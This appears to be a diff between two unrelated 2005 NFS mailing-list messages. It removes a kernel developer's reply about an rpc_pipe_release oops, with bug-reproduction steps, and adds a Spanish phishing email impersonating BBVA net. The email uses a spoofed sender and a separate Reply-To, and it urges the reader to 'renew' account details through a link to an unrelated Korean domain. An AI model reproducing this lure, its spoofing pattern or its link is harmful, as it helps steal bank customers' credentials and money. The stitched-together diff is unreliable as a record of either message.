@@ -1,22 +1,24 @@
-From: Steve Dickson <SteveD@redhat.com>
-Subject: Re: oops in rpc_pipe_release
-Date: Tue, 08 Nov 2005 15:51:33 -0500
-Message-ID: <43710FD5.8080306@RedHat.com>
-References: <436FEB9B.3010007@google.com> <4370B4E0.6090306@RedHat.com>	 <4370F072.3090104@google.com>  <4370F56D.6090606@RedHat.com> <1131479893.32482.45.camel@lade.trondhjem.org>
+From: <comunica@grupobbva.com>
+Subject: BBVA net (ID 53219)
+Date: Wed, 09 Nov 2005 11:54:38 -0800
+Message-ID: <E1EZw1m-0002S6-LC@rh-2.fiberfeed.com>
+Reply-To: jordi_oviedo@terra.es
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii; format=flowed
-Cc: nfs@lists.sourceforge.net
+Content-Type: text/html
 Return-path: <nfs-admin@lists.sourceforge.net>
-Received: from sc8-sf-mx1-b.sourceforge.net ([10.3.1.91] helo=mail.sourceforge.net)
+Received: from sc8-sf-mx2-b.sourceforge.net ([10.3.1.92] helo=mail.sourceforge.net)
 	by sc8-sf-list2.sourceforge.net with esmtp (Exim 4.30)
-	id 1EZaRa-0007Az-Gm
-	for nfs@lists.sourceforge.net; Tue, 08 Nov 2005 12:51:50 -0800
-Received: from mx1.redhat.com ([66.187.233.31])
-	by mail.sourceforge.net with esmtp (Exim 4.44)
-	id 1EZaRZ-0000gu-7X
-	for nfs@lists.sourceforge.net; Tue, 08 Nov 2005 12:51:50 -0800
-To: Trond Myklebust <trond.myklebust@fys.uio.no>
-In-Reply-To: <1131479893.32482.45.camel@lade.trondhjem.org>
+	id 1EZw1l-0005LL-O2
+	for nfs@lists.sourceforge.net; Wed, 09 Nov 2005 11:54:37 -0800
+Received: from rh-2.fiberfeed.com ([65.110.12.230])
+	by mail.sourceforge.net with esmtps (TLSv1:AES256-SHA:256)
+	(Exim 4.44)
+	id 1EZw1i-00015Z-Oa
+	for nfs@lists.sourceforge.net; Wed, 09 Nov 2005 11:54:37 -0800
+Received: from nobody by rh-2.fiberfeed.com with local (Exim 4.51)
+	id 1EZw1m-0002S6-LC
+	for nfs@lists.sourceforge.net; Wed, 09 Nov 2005 11:54:38 -0800
+To: nfs@lists.sourceforge.net
 Sender: nfs-admin@lists.sourceforge.net
 Errors-To: nfs-admin@lists.sourceforge.net
 List-Unsubscribe: <https://lists.sourceforge.net/lists/listinfo/nfs>,
@@ -30,37 +32,34 @@ List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/nfs>,
 	<mailto:nfs-request@lists.sourceforge.net?subject=subscribe>
 List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum=nfs>
 
-Trond Myklebust wrote:
-> 
-> I'd rather like to find out how this is happening, and fix the root
-> cause. Your patch seems like a bit too much of a band-aid.
-Yeah I know its a hack.... I just wanted to make sure it address
-the root cause of Vince's problem... Unfortunately I'm a bit
-under the gun w.r.t, to deadlines... and an oops is an oops...
-so I might have to go with it...
-
-> 
-> My point is that we should never want to find ourselves in the situation
-> that the directory is being cleared without the auth code having first
-> cleaned up and deleted its pipes.
-Well here is how you should be able to reproduce it
-as spelled out in bz 171112:
-(https://bugzilla.redhat.com/bugzilla/show_bug.cgi?id=171112)
-
-root# mount -o krb5 server:/export /mnt
-user$ cd /mnt
-root# /bin/service nets stop
-root# /bin/service rpcidmapd stop
-root# kill -9 $(pgrep -u <user>)
+BBVA net<br>
+Estimado nfs@lists.sourceforge.net
+!<br>
+Nosotros no hemos podido proceder las operaciones ultimas sobre vuestra c=
+uenta. Para garantir que vuestra cuenta no esta suspendido, renueve, por =
+favor, vuesta informacion. Si usted ha renovado su informacion recienteme=
+nte, rechazar, desprecie, por favor, porque nosotros procedemos los cambi=
+os cuales usted ha hecho. <br><br>
+<a href=3D"http://www.novo.pe.kr/ktools/reda.php">La Banca en Internet </=
+a><br><br>
+adelante es no quedarse atras <br>
+* adelante es acceder a BBVA ahora y las 24 horas del dia.<br>
+* adelante es administrar tus cuentas de la manera mas sencilla.<br>
+* adelante es disponer de los productos y servicios exclusivos que mejor =
+se adaptan a ti.<br>
+* adelante es que nos tengas siempre a un clic de distancia.<br>
+* adelante es que disfrutes de la mejor banca online.<br>
+adelante es BBVA net <br><br>
+Llene la forma following BBVA NET<br>
 
 
-steved.
 
 
 
 -------------------------------------------------------
 SF.Net email is sponsored by:
-Tame your development challenges with Apache's Geronimo App Server. Download
+Tame your development challenges with Apache's Geronimo App Server. Downl=
+oad
 it for free - -and be entered to win a 42" plasma tv or your very own
 Sony(tm)PSP.  Click here to play: http://sourceforge.net/geronimo.php
 _______________________________________________
